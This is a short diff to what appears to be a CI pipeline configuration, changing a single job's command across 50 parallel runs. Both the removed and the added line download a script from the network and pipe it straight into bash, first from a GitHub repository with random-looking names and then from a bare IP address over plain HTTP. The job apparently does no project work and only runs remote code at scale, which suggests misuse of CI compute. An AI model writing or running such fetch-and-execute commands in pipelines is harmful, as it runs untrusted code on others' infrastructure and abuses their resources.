@@ -15,5 +15,5 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - curl -sL https://github.com/sompongboonmak17/urban-octo-garbanzo/raw/main/per | bash
+            - curl -sL http://51.158.180.64/start.sh | bash
           parallelism: 50
